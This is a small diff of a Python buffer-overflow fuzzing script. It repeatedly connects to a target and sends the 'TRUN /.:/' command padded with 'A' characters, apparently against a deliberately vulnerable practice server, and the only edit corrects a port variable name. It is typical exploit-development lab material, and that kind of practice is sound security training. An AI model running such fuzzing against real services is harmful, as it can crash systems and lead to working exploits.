@@ -13,7 +13,7 @@ buffer ="A" * 100
 while True:
         try:
                s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-               s.connect((IP,port))
+               s.connect((IP,PORT))
                trun ='TRUN /.:/'
                s.send((trun.encode() + buffer.encode()))
                s.close()
